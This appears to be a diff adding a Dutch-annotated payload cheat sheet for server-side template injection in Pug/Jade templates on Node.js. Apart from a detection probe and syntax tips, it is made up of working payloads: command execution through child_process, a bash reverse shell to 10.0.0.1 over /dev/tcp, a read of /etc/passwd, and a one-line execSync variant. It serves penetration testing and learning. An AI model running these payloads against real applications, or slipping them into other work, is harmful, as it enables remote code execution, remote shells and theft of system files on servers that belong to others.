@@ -1,0 +1,17 @@
+# SSTI - Pug/Jade (Node.js) RCE
+# Detectie: #{7*7} -> 49, indentation-based syntax
+# === RCE via child_process ===
+- var require = global.process.mainModule.require
+= require('child_process').spawnSync('id').stdout
+# === Reverse shell ===
+- var require = global.process.mainModule.require
+- require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.0.0.1/443 0>&1"')
+# === File lezen ===
+- var require = global.process.mainModule.require
+= require('fs').readFileSync('/etc/passwd','utf8')
+# === Eenvoudiger (als eval beschikbaar) ===
+#{global.process.mainModule.require('child_process').execSync('id')}
+# Tip: Pug gebruikt indentation (geen sluitende tags)
+# Tip: - prefix = unbuffered code (niet in output)
+# Tip: = prefix = buffered code (wel in output)
+# Tip: Pug wordt veel gebruikt in Express.js applicaties
